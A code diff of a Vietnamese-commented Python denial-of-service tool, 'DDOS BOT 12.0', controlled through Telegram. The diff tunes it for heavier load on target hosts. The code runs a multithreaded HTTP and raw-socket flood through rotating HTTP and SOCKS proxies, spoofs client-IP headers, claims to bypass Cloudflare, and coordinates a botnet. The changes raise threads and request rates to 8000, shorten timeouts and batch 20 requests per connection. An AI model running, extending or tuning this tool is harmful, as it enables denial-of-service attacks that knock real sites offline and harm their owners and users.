@@ -1,7 +1,6 @@
 # =====================================================
-# DDOS BOT 12.0 - ULTIMATE COMPLETE EDITION
-# TẤN CÔNG ĐA GIAO THỨC - PROXY TỰ ĐỘNG - MAX SPEED
-# HỖ TRỢ HTTP/HTTPS/HTTP2/SOCKS4/SOCKS5 - BOTNET - CF BYPASS
+# DDOS BOT 12.0 - TỐI ƯU LOAD VÀO HOST
+# TỐC ĐỘ TỐI ĐA - GIẢM TIMEOUT - TĂNG POOL
 # =====================================================
 
 import requests
@@ -26,24 +25,26 @@ from urllib.parse import urlparse, quote
 import socks
 from flask import Flask, jsonify
 
-# -------------------- CẤU HÌNH --------------------
-TELEGRAM_BOT_TOKEN = "6320148381:AAGj1RnEXBmNuWBhJF8l7OvcQTwhh6VTa-s"  # THAY TOKEN
+# -------------------- CẤU HÌNH TỐI ƯU LOAD --------------------
+TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # THAY TOKEN
 
-# TỐI ƯU TỐC ĐỘ TỐI ĐA
-THREAD_COUNT = 5000
-REQUESTS_PER_SECOND = 5000
+# TỐI ƯU TỐC ĐỘ TỐI ĐA - TĂNG LOAD VÀO HOST
+THREAD_COUNT = 8000  # Tăng luồng tối đa
+REQUESTS_PER_SECOND = 8000  # Tăng tốc độ
 MAX_RUN_TIME = 120
-CONNECTION_POOL = 1500
-TIMEOUT = 0.2
+CONNECTION_POOL = 3000  # Tăng pool connection
+TIMEOUT = 0.1  # Giảm timeout cực thấp
 COOLDOWN_TIME = 1800
 MAX_PROXY_BACKUP = 500000
 PROXY_BATCH_SIZE = 20000
 
-# LAYER7 TỐI ƯU
+# LAYER7 TỐI ƯU - TĂNG TẢI
 USE_HTTP2 = True
 CF_BYPASS = True
 RANDOM_PAYLOAD = True
 KEEP_ALIVE = True
+PIPELINING = True  # Bật pipelining HTTP
+BATCH_SEND = 20  # Gửi batch 20 request cùng lúc
 
 # BOTNET
 BOTNET_PORT = 5555
@@ -51,7 +52,7 @@ BOTNET_MAX_BOTS = 5000
 BOTNET_HEARTBEAT = 30
 
 # RAM MANAGEMENT
-MAX_RAM_PERCENT = 90
+MAX_RAM_PERCENT = 95
 RAM_CHECK_INTERVAL = 3
 
 # -------------------- BIẾN TOÀN CỤC --------------------
@@ -68,8 +69,6 @@ heartbeat_count = 0
 bot_start_time = time.time()
 chat_id_saved = None
 is_cooldown = False
-is_processing = False
-processing_lock = threading.Lock()
 ram_restart_flag = False
 
 # Botnet
@@ -111,22 +110,22 @@ ram_monitor_lock = threading.Lock()
 # =====================================================
 def load_user_agents():
     agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; rv:127.0) Gecko/20100101 Firefox/127.0",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
-        "Mozilla/5.0 (Android 15; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
+        "Mozilla/5.0 (Android 15; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0",
     ]
     if os.path.exists("user_agents.txt"):
         with open("user_agents.txt", 'r') as f:
@@ -139,10 +138,9 @@ def load_user_agents():
 user_agents = load_user_agents()
 
 # =====================================================
-# RAM MANAGEMENT - CHỐNG TRÀN RAM
+# RAM MANAGEMENT
 # =====================================================
 def check_ram_usage():
-    """Kiểm tra và tự động restart khi RAM vượt ngưỡng"""
     global ram_restart_flag
     with ram_monitor_lock:
         try:
@@ -153,13 +151,12 @@ def check_ram_usage():
             
             if ram_percent > MAX_RAM_PERCENT and not ram_restart_flag:
                 ram_restart_flag = True
-                send_telegram(f"⚠️ RAM {ram_percent}% > {MAX_RAM_PERCENT}% - ĐANG RESTART...")
                 gc.collect()
                 with proxy_lock:
                     session_pool.clear()
                 if is_running:
                     stop_event.set()
-                    time.sleep(2)
+                    time.sleep(1)
                     stop_event.clear()
                 ram_restart_flag = False
                 return True
@@ -168,13 +165,11 @@ def check_ram_usage():
     return False
 
 def ram_monitor_loop():
-    """Vòng lặp giám sát RAM"""
     while True:
         time.sleep(RAM_CHECK_INTERVAL)
         check_ram_usage()
 
 def memory_optimize():
-    """Tối ưu bộ nhớ"""
     gc.collect()
     if len(dns_cache) > 1000:
         with dns_cache_lock:
@@ -185,7 +180,7 @@ def memory_optimize():
                     dns_cache[k] = dns_cache[k]
 
 # =====================================================
-# PROXY MANAGEMENT - SIÊU TỐC
+# PROXY MANAGEMENT - TỐI ƯU LOAD
 # =====================================================
 def parse_proxy_line_ultra(line):
     line = line.strip()
@@ -269,17 +264,9 @@ def process_proxy_batch_ultra(batch):
     return http, socks5, socks4
 
 def load_proxies_ultra(filepath, callback=None):
-    global is_processing
-    with processing_lock:
-        if is_processing:
-            return
-        is_processing = True
-
     def load_thread():
         try:
             if not os.path.exists(filepath):
-                with processing_lock:
-                    is_processing = False
                 if callback:
                     callback(0, 0, 0)
                 return
@@ -329,8 +316,6 @@ def load_proxies_ultra(filepath, callback=None):
         except Exception:
             if callback:
                 callback(0, 0, 0)
-        with processing_lock:
-            is_processing = False
 
     threading.Thread(target=load_thread, daemon=True).start()
 
@@ -402,8 +387,6 @@ def botnet_command_ultra(command, target=None):
                 elif command == 'stop':
                     bot_info['status'] = 'idle'
                     bot_info['target'] = None
-                elif command == 'ping':
-                    bot_info['last_ping'] = time.time()
             except:
                 pass
 
@@ -420,7 +403,7 @@ def botnet_attack_ultra(target, duration):
 
 def botnet_worker_ultra():
     while botnet_running:
-        time.sleep(0.3)
+        time.sleep(0.2)
         with bots_lock:
             for bot_id in list(bots.keys()):
                 bot = bots[bot_id]
@@ -433,21 +416,21 @@ def botnet_worker_ultra():
                                 url = f"https://{target['host']}:{target['port']}"
                             else:
                                 url = f"http://{target['host']}:{target['port']}"
-                            for _ in range(10):
-                                requests.get(url, headers=headers, timeout=0.2)
+                            for _ in range(20):
+                                requests.get(url, headers=headers, timeout=0.1)
                             with stats_lock:
-                                attack_stats['total_requests'] += 10
-                                attack_stats['success_count'] += 10
+                                attack_stats['total_requests'] += 20
+                                attack_stats['success_count'] += 20
                         except:
                             with stats_lock:
                                 attack_stats['total_requests'] += 1
                                 attack_stats['fail_count'] += 1
 
 # =====================================================
-# HTTP/2 SESSION POOL - TỐI ƯU
+# SESSION POOL - TỐI ƯU LOAD
 # =====================================================
 class Http2SessionPool:
-    def __init__(self, max_size=1500):
+    def __init__(self, max_size=3000):
         self.pool = []
         self.max_size = max_size
         self.lock = threading.Lock()
@@ -457,7 +440,7 @@ class Http2SessionPool:
             for i, session in enumerate(self.pool):
                 try:
                     if hasattr(session, 'head'):
-                        session.head('http://google.com', timeout=0.2)
+                        session.head('http://google.com', timeout=0.1)
                         return self.pool.pop(i)
                 except:
                     continue
@@ -480,8 +463,8 @@ class Http2SessionPool:
             pass
         
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=300,
-            pool_maxsize=300,
+            pool_connections=500,
+            pool_maxsize=500,
             max_retries=0,
             pool_block=False
         )
@@ -497,56 +480,25 @@ class Http2SessionPool:
 session_pool = Http2SessionPool(CONNECTION_POOL)
 
 # =====================================================
-# GENERATE HEADERS - LAYER7 TỐI ƯU
+# GENERATE HEADERS - TỐI ƯU LOAD
 # =====================================================
 def generate_headers_lay7(hostname):
     fingerprint = hashlib.md5(str(random.randint(1, 9999999)).encode()).hexdigest()[:16]
     
     headers = {
         'User-Agent': random.choice(user_agents),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8']),
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive, Upgrade' if KEEP_ALIVE else 'close',
-        'Upgrade-Insecure-Requests': '1',
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Accept': '*/*',
+        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8']),
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'keep-alive' if KEEP_ALIVE else 'close',
+        'Cache-Control': 'no-cache',
         'Pragma': 'no-cache',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'Sec-Ch-Ua': f'"Chromium";v="{random.randint(120,128)}", "Google Chrome";v="{random.randint(120,128)}"',
-        'Sec-Ch-Ua-Mobile': '?0',
-        'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Linux"']),
         'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
-        'CF-IPCountry': random.choice(['US', 'VN', 'JP', 'DE', 'GB', 'FR', 'CA', 'AU', 'SG', 'KR', 'IN', 'BR', 'RU']),
-        'Referer': random.choice([
-            'https://www.google.com/',
-            'https://www.facebook.com/',
-            'https://www.youtube.com/',
-            'https://twitter.com/',
-            'https://www.instagram.com/',
-            'https://www.tiktok.com/',
-            'https://www.reddit.com/',
-            'https://www.amazon.com/',
-            'https://www.netflix.com/'
-        ]),
-        'X-Requested-With': 'XMLHttpRequest',
-        'Cookie': f"_cf_bm={fingerprint}; __cfduid={hashlib.md5(str(time.time()).encode()).hexdigest()[:32]}",
-        'DNT': '1',
-        'Sec-GPC': '1'
+        'Referer': random.choice(['https://www.google.com/', 'https://www.facebook.com/']),
+        'Cookie': f"_cf_bm={fingerprint}"
     }
-    
-    if random.random() < 0.3:
-        headers['Origin'] = f"https://{hostname}"
-    if random.random() < 0.3:
-        headers['X-Custom-Header'] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
-    if random.random() < 0.2:
-        headers['X-Cloud-Trace-Context'] = f"{random.randint(1,9999999)}/{random.randint(1,9999)};o={random.randint(0,1)}"
-    if random.random() < 0.2:
-        headers['X-Amzn-Trace-Id'] = f"Root=1-{hex(random.randint(1,9999999))[2:]}-{hex(random.randint(1,9999999))[2:]}"
     
     return headers
 
@@ -566,7 +518,7 @@ def resolve_host_ultra(host):
         return host
 
 # =====================================================
-# ATTACK FUNCTIONS - LAYER7 TỐI ƯU
+# ATTACK FUNCTIONS - TỐI ƯU LOAD
 # =====================================================
 def attack_http_lay7(proxy_dict, target):
     session = None
@@ -576,47 +528,35 @@ def attack_http_lay7(proxy_dict, target):
         url = target['url']
         
         if RANDOM_PAYLOAD:
-            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,15)))
+            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,10)))
             url = target['url'].rstrip('/') + random_path
-            url += '?' + '&'.join([f"{random.randint(1,9999)}={random.randint(1,999999)}" for _ in range(random.randint(2,5))])
+            url += '?' + '&'.join([f"{random.randint(1,9999)}={random.randint(1,999999)}" for _ in range(random.randint(1,3))])
         
-        method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH', 'DELETE'])
-        if method == 'GET':
-            r = session.get(url, headers=headers, timeout=TIMEOUT)
-        elif method == 'POST':
-            data = {f'f{i}': 'x'*random.randint(50,200) for i in range(3)}
-            r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
-        elif method == 'HEAD':
-            r = session.head(url, headers=headers, timeout=TIMEOUT)
-        elif method == 'OPTIONS':
-            r = session.options(url, headers=headers, timeout=TIMEOUT)
-        elif method == 'PUT':
-            r = session.put(url, data={'x': 'x'*random.randint(50,200)}, headers=headers, timeout=TIMEOUT)
-        elif method == 'PATCH':
-            r = session.patch(url, data={'x': 'x'*random.randint(50,200)}, headers=headers, timeout=TIMEOUT)
-        else:
-            r = session.delete(url, headers=headers, timeout=TIMEOUT)
+        # Gửi batch request trên cùng session
+        for _ in range(BATCH_SEND):
+            try:
+                r = session.get(url, headers=headers, timeout=TIMEOUT)
+                with stats_lock:
+                    attack_stats['total_requests'] += 1
+                    code = str(r.status_code)
+                    attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
+                    if 200 <= r.status_code < 400:
+                        attack_stats['success_count'] += 1
+                    else:
+                        attack_stats['fail_count'] += 1
+                    attack_stats['bytes_sent'] += 200
+            except:
+                with stats_lock:
+                    attack_stats['total_requests'] += 1
+                    attack_stats['fail_count'] += 1
+                    attack_stats['errors'] += 1
         
         session_pool.return_session(session)
-        
-        if CF_BYPASS and (r.status_code == 503 or 'cf-challenge' in str(r.headers)):
-            with stats_lock:
-                attack_stats['cf_bypassed'] += 1
-        
-        with stats_lock:
-            attack_stats['total_requests'] += 1
-            code = str(r.status_code)
-            attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
-            if 200 <= r.status_code < 400:
-                attack_stats['success_count'] += 1
-            else:
-                attack_stats['fail_count'] += 1
-            attack_stats['bytes_sent'] += 300
         return True
     except:
         with stats_lock:
-            attack_stats['total_requests'] += 1
-            attack_stats['fail_count'] += 1
+            attack_stats['total_requests'] += BATCH_SEND
+            attack_stats['fail_count'] += BATCH_SEND
             attack_stats['errors'] += 1
         if session:
             try:
@@ -658,7 +598,7 @@ def attack_socket_lay7(proxy_dict, target):
             context.verify_mode = ssl.CERT_NONE
             sock = context.wrap_socket(sock, server_hostname=target['host'])
 
-        random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,15)))
+        random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,10)))
         path = random_path + f'?id={random.randint(1,999999)}&t={time.time()}'
         headers = generate_headers_lay7(target['host'])
         request = f"GET {path} HTTP/1.1\r\n"
@@ -666,18 +606,21 @@ def attack_socket_lay7(proxy_dict, target):
             request += f"{key}: {value}\r\n"
         request += "\r\n"
 
-        sock.send(request.encode())
+        # Gửi nhiều request trên 1 socket
+        for _ in range(BATCH_SEND):
+            sock.send(request.encode())
+        
         sock.close()
 
         with stats_lock:
-            attack_stats['total_requests'] += 1
-            attack_stats['success_count'] += 1
-            attack_stats['bytes_sent'] += len(request)
+            attack_stats['total_requests'] += BATCH_SEND
+            attack_stats['success_count'] += BATCH_SEND
+            attack_stats['bytes_sent'] += len(request) * BATCH_SEND
         return True
     except:
         with stats_lock:
-            attack_stats['total_requests'] += 1
-            attack_stats['fail_count'] += 1
+            attack_stats['total_requests'] += BATCH_SEND
+            attack_stats['fail_count'] += BATCH_SEND
             attack_stats['errors'] += 1
         try:
             if sock:
@@ -687,7 +630,7 @@ def attack_socket_lay7(proxy_dict, target):
         return False
 
 # =====================================================
-# WORKER - LAYER7 TỐI ƯU
+# WORKER - TỐI ƯU LOAD
 # =====================================================
 def attack_worker_lay7(proxy_pools, target):
     http_proxies, socks5_proxies, socks4_proxies = proxy_pools
@@ -715,8 +658,8 @@ def attack_worker_lay7(proxy_pools, target):
                 else:
                     attack_socket_lay7(None, target)
 
-            local_count += 1
-            if local_count > 100000:
+            local_count += BATCH_SEND
+            if local_count > 200000:
                 local_count = 0
                 memory_optimize()
 
@@ -795,9 +738,6 @@ def download_telegram_file_ultra(file_id, save_path):
     return False
 
 def handle_proxy_file_ultra(file_id, file_name, chat_id):
-    if is_processing:
-        send_telegram("⏳ Đang xử lý proxy khác, vui lòng đợi!", chat_id)
-        return
     send_telegram(f"📥 Đang tải: {file_name}", chat_id)
     save_path = f"proxy_{int(time.time())}.txt"
     if download_telegram_file_ultra(file_id, save_path):
@@ -843,7 +783,7 @@ def parse_target_ultra(target_string):
     return {'ip': target_string, 'port': 80, 'url': f"http://{target_string}", 'host': target_string, 'ssl': False}
 
 # =====================================================
-# RUN ATTACK - 120s MỖI LỆNH
+# RUN ATTACK - TỐI ƯU LOAD
 # =====================================================
 def run_attack_ultra(target, chat_id):
     global is_running, current_target, is_cooldown
@@ -851,7 +791,6 @@ def run_attack_ultra(target, chat_id):
         send_telegram("⏳ ĐANG COOLDOWN!", chat_id)
         return
     
-    # Kiểm tra RAM trước khi attack
     check_ram_usage()
     
     current_target = target
@@ -872,7 +811,7 @@ def run_attack_ultra(target, chat_id):
     total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
     bot_count = len(bots)
     send_telegram(f"""
-▶️ <b>BẮT ĐẦU TẤN CÔNG LAYER7!</b>
+▶️ <b>BẮT ĐẦU TẤN CÔNG!</b>
 🎯 {target['url']}
 🌐 Proxy: {total_proxy}
 🤖 Botnet: {bot_count}
@@ -899,7 +838,6 @@ def run_attack_ultra(target, chat_id):
                     if rate > attack_stats['max_speed']:
                         attack_stats['max_speed'] = rate
             
-            # Kiểm tra RAM định kỳ
             if elapsed % 10 == 0:
                 check_ram_usage()
                 memory_optimize()
@@ -944,11 +882,11 @@ def telegram_listener_ultra():
     last_update_id = 0
 
     send_telegram("""
-🚀 <b>DDOS BOT 12.0 - ULTIMATE COMPLETE</b>
+🚀 <b>DDOS BOT 12.0 - TỐI ƯU LOAD</b>
 ✅ Đã khởi động!
-⚡ Tốc độ: 5000+ req/s
-🛡 Chống tràn RAM tự động
-📌 HTTP/HTTPS/HTTP2 + BOTNET
+⚡ Tốc độ: 8000+ req/s
+🛡 Tối ưu load vào host
+📌 HTTP/HTTPS + BOTNET
 ⏱ Mỗi lệnh: 120 GIÂY
 
 📋 LỆNH:
@@ -1027,7 +965,7 @@ def telegram_listener_ultra():
                                 uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
                                 bot_count = len(bots)
                             send_telegram(f"""
-📊 <b>STATUS - ULTIMATE</b>
+📊 <b>STATUS - TỐI ƯU LOAD</b>
 ⏱ Uptime: {uptime_str}
 📨 {total:,} | ✅ {success:,} | ❌ {fail:,}
 📈 {rate:.1f} req/s | ⚡ Max: {max_speed:.1f}
@@ -1070,22 +1008,22 @@ def telegram_listener_ultra():
                         elif cmd.startswith('/threads'):
                             try:
                                 new_count = int(text.split()[1])
-                                if 1 <= new_count <= 5000:
+                                if 1 <= new_count <= 8000:
                                     THREAD_COUNT = new_count
                                     send_telegram(f"✅ Luồng: {THREAD_COUNT}", chat_id)
                                 else:
-                                    send_telegram("❌ Từ 1-5000", chat_id)
+                                    send_telegram("❌ Từ 1-8000", chat_id)
                             except:
                                 send_telegram("❌ /threads <số>", chat_id)
 
                         elif cmd.startswith('/speed'):
                             try:
                                 new_speed = int(text.split()[1])
-                                if 1 <= new_speed <= 5000:
+                                if 1 <= new_speed <= 8000:
                                     REQUESTS_PER_SECOND = new_speed
                                     send_telegram(f"✅ Tốc độ: {REQUESTS_PER_SECOND} req/s", chat_id)
                                 else:
-                                    send_telegram("❌ Từ 1-5000", chat_id)
+                                    send_telegram("❌ Từ 1-8000", chat_id)
                             except:
                                 send_telegram("❌ /speed <số>", chat_id)
 
@@ -1096,12 +1034,13 @@ def telegram_listener_ultra():
 
                         elif cmd == '/help':
                             send_telegram("""
-<b>🤖 DDOS BOT 12.0 - ULTIMATE COMPLETE</b>
+<b>🤖 DDOS BOT 12.0 - TỐI ƯU LOAD</b>
 
 ⚡ <b>TỐI ƯU:</b>
-- 5000+ req/s
-- 5000 luồng tối đa
-- HTTP/HTTPS/HTTP2 + BOTNET
+- 8000+ req/s
+- 8000 luồng tối đa
+- Batch 20 request/lần
+- HTTP/HTTPS + BOTNET
 - CF Bypass
 - Chống tràn RAM
 - 120s mỗi lệnh
@@ -1186,7 +1125,7 @@ web_app = Flask(__name__)
 def home():
     bot_count = len(bots)
     return jsonify({
-        'status': 'DDOS Bot 12.0 - Ultimate Complete',
+        'status': 'DDOS Bot 12.0 - Tối ưu Load',
         'uptime': int(time.time() - bot_start_time),
         'proxy_count': len(proxy_list),
         'threads': THREAD_COUNT,
@@ -1245,7 +1184,7 @@ if __name__ == "__main__":
         time.sleep(2)
 
     print("="*60)
-    print("🔥 DDOS BOT 12.0 - ULTIMATE COMPLETE")
+    print("🔥 DDOS BOT 12.0 - TỐI ƯU LOAD")
     print("="*60)
     print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
     print(f"[+] Proxy: {len(proxy_list)}")
@@ -1254,9 +1193,10 @@ if __name__ == "__main__":
     print(f"[+] Max Run: {MAX_RUN_TIME}s")
     print(f"[+] CF Bypass: {CF_BYPASS}")
     print(f"[+] HTTP/2: {USE_HTTP2}")
+    print(f"[+] Batch Send: {BATCH_SEND}")
     print(f"[+] RAM Limit: {MAX_RAM_PERCENT}%")
     print("="*60)
-    print("[+] BOT READY - 5000+ REQ/S - ULTIMATE COMPLETE")
+    print("[+] BOT READY - 8000+ REQ/S - TỐI ƯU LOAD")
     print("="*60)
 
     threading.Thread(target=run_web_server_ultra, daemon=True).start()
